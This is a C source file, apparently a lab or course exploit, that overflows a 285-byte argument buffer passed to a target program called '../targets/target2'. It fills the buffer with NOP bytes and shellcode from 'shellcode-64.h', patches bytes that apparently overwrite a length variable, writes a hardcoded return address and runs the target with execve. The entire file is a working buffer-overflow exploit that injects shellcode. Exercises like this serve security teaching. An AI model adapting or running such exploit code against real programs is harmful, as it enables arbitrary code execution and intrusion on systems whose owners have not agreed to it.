#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define NOP 0x90
#define BUF_SIZE 285
#define ADDR 0x3021fd80

int
main ( int argc, char * argv[] )
{
    char *	args[3];
    char *	env[1];
    char *ptr;
    char buff[BUF_SIZE];
    int* int_ptr;
    int i;

    ptr = buff;

    // *int_ptr = BUF_SIZE; // overwrite len variable in foo()

    for (i = 0; i < BUF_SIZE; i++) {
//        if (i == 266 || i == 267 || i == 270 || i == 271 || i == 268 || i == 269) {
//            continue;
//        }
        buff[i] = NOP;
    }

    buff[264] = '\x1d';
    buff[265] = '\x01';
    buff[267] = '\x00';
    buff[268] = '\x00';

//    *(int *) & buff[264] = 285;

//    buff[268] = '\x0b';
//    buff[269] = '\x01';

    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

    int_ptr = (int*) &buff[280];
    *int_ptr = ADDR;
    buff[BUF_SIZE - 1] = '\0';

    args[0] = TARGET;
    args[1] = buff;
    args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
